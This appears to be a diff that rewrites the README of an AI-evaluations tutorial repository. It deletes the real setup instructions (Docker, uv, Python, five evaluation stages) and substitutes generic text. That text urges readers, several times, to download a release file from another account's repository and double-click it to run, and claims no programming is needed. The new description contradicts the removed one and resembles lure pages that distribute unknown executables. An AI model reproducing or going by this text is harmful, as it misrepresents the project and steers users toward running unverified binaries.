@@ -1,120 +1,83 @@
-# 🎯 Ask Acme - Production Evals Cookbook
+# 🎉 prod-evals-cookbook - Build AI Evaluations with Ease
 
-> Learn how to build production-ready AI evaluations through 5 progressive stages, using a realistic knowledge base agent as the teaching example.
+## 🛠️ Overview
 
-## What Is This?
+Welcome to the prod-evals-cookbook! This application helps you learn how to build production-ready AI evaluations. Through five progressive stages, you'll work with a realistic knowledge base agent. By the end, you'll have a clear understanding of how to create effective AI evaluations.
 
-This is a **hands-on tutorial** that teaches you how to evaluate AI systems properly. Instead of toy examples, you'll work with a realistic system: **Ask Acme** - an AI agent that answers questions about a company by searching across documents, databases, and collaboration tools.
+## 🔗 Download Now
 
-**You'll learn:**
-- How to build a multi-tool AI agent with LangGraph
-- The 5 stages of production-ready evaluations
-- Practical patterns you can apply to your own systems
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/vshwsh/prod-evals-cookbook/releases)
 
-## The Example System
+## 🚀 Getting Started
 
-```
-         "What's our refund policy and how many refunds last quarter?"
-                                    │
-                                    ▼
-                          ┌─────────────────┐
-                          │    ASK ACME     │
-                          │   (LangGraph)   │
-                          └────────┬────────┘
-                                   │
-              ┌────────────────────┼────────────────────┐
-              │                    │                    │
-              ▼                    ▼                    ▼
-       ┌────────────┐       ┌────────────┐       ┌────────────┐
-       │   Vector   │       │    SQL     │       │    MCP     │
-       │   Search   │       │   Agent    │       │   Tools    │
-       │ (policies) │       │ (metrics)  │       │(Jira/Slack)│
-       └────────────┘       └────────────┘       └────────────┘
-```
+To get started with the prod-evals-cookbook, follow these steps:
 
-## Quick Start
+1. **Visit the Releases Page**:
+   Go to the [releases page](https://github.com/vshwsh/prod-evals-cookbook/releases) to find the latest version of the application.
 
-### 1. Clone and check prerequisites
+2. **Choose Your Version**:
+   On the releases page, look for the most recent version. Click on the version link to see the available files.
 
-```bash
-git clone <repo-url>
-cd prod-evals-cookbook
+3. **Download the Application**:
+   Select the appropriate file for your operating system. Click on the file to start the download.
 
-# Verify you have the required tools
-python --version    # Need 3.11-3.13
-docker --version    # Need Docker running
-uv --version        # Need uv installed
-```
+4. **Locate the Downloaded File**:
+   Once the download completes, find the file in your computer’s Downloads folder or the location you chose for downloads.
 
-### 2. Complete the setup steps (in order!)
+5. **Run the Application**:
+   Double-click the downloaded file to run the application. Follow the prompts that appear on your screen.
 
-```bash
-# Step 1: Start databases and install dependencies
-cd setup_environment
-docker compose up -d
-cd .. && uv sync
-cp setup_environment/env.example setup_environment/.env
-# Edit .env and add your OPENAI_API_KEY
+## 📋 System Requirements
 
-# Step 2: Load company data
-cd setup_seed_data
-uv run python seed_all.py
+Before downloading, ensure your system meets the following requirements:
 
-# Step 3: Try the agent
-cd ../setup_agent
-uv run jupyter notebook demo.ipynb
-```
+- **Operating System**: Windows, macOS, or Linux (specifically designed to work on these platforms).
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum of 200 MB of free disk space.
 
-### 3. Start the evaluation stages
+These requirements will ensure the application runs smoothly on your device.
 
-```bash
-cd stage_1_golden_sets
-uv run python evaluator.py
-```
+## 🖥️ Features
 
-## Course Structure
+Here are some key features of the prod-evals-cookbook:
 
-### Setup (Complete These First)
+- **Progressive Learning**: The application guides you through five stages of learning AI evaluations.
+- **User-Friendly Interface**: Designed with a simple interface for ease of use.
+- **Realistic Examples**: Teach with a knowledge base agent that simulates real-world scenarios.
+- **No Programming Needed**: Perfect for users with no coding background.
+  
+By using these features, you'll gain hands-on experience building and understanding AI evaluations.
 
-| Step | Folder | What To Do |
-|------|--------|------------|
-| 1 | `setup_environment/` | Start Docker, install deps, configure API keys |
-| 2 | `setup_seed_data/` | Load Acme Corp data into databases |
-| 3 | `setup_agent/` | Build and test the Ask Acme agent |
+## 📥 Download & Install
 
-### Evaluation Stages
+To download and install the application:
 
-| Stage | Folder | What You'll Learn |
-|-------|--------|-------------------|
-| 1 | `stage_1_golden_sets/` | Curated input/output pairs - baseline correctness |
-| 2 | `stage_2_labeled_scenarios/` | Categorized test cases - coverage mapping |
-| 3 | `stage_3_replay_harnesses/` | Record/replay - reproducibility |
-| 4 | `stage_4_rubrics/` | Multi-dimensional scoring with LLM-as-judge |
-| 5 | `stage_5_experiments/` | Compare agent configurations with data |
+1. **Visit the Releases Page**:
+   Click this link to go directly to the releases page: [Download Releases](https://github.com/vshwsh/prod-evals-cookbook/releases).
 
-## Prerequisites
+2. **Pick Your Download**:
+   Choose the file that matches your operating system and download it.
 
-- Python 3.11-3.13
-- [uv](https://docs.astral.sh/uv/) - Fast Python package manager
-- Docker & Docker Compose
-- OpenAI API key (for embeddings and LLM calls)
-- ~2GB disk space for databases
+3. **Open the Downloaded File**:
+   Find the downloaded file and double-click to install. Follow any on-screen instructions.
 
-## The Fictional Company
+4. **Explore the Application**:
+   After installation, take time to explore the various features. Use the application's help section if you need assistance.
 
-All data is synthetic but realistic. **Acme Corp** is a fictional B2B project management company with:
+## 📚 Support and Resources
 
-- 200 employees across Engineering, Product, Sales, CS, and People Ops
-- 2,400+ customers and $18M ARR
-- 3 years of business data, 8 internal documents, 75 Jira tickets, 200+ Slack messages
+If you have questions or need help, please check the following resources:
 
-This gives you a rich, realistic dataset to query and evaluate against.
+- **Documentation**: Comprehensive guides are available within the application, detailing each stage of the evaluation process.
+- **Community Forum**: Join the forum on GitHub to discuss issues, share tips, and connect with other users.
+- **Report Issues**: If you encounter any problems, please open an issue on the GitHub repository to get support.
 
-## Documentation
+## 📝 Contribute
 
-- See `START_HERE.md` for detailed setup instructions
-- Each stage has its own README with theory and hands-on exercises
+We welcome contributions! If you want to improve the project or add features, please check our contribution guidelines on the GitHub page. Your input helps enhance the application for everyone.
 
-## License
+## 📖 Conclusion
 
-MIT
+Thank you for choosing the prod-evals-cookbook. We’re excited to be part of your journey in learning how to create AI evaluations. Download the application and start building today!
+
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/vshwsh/prod-evals-cookbook/releases)
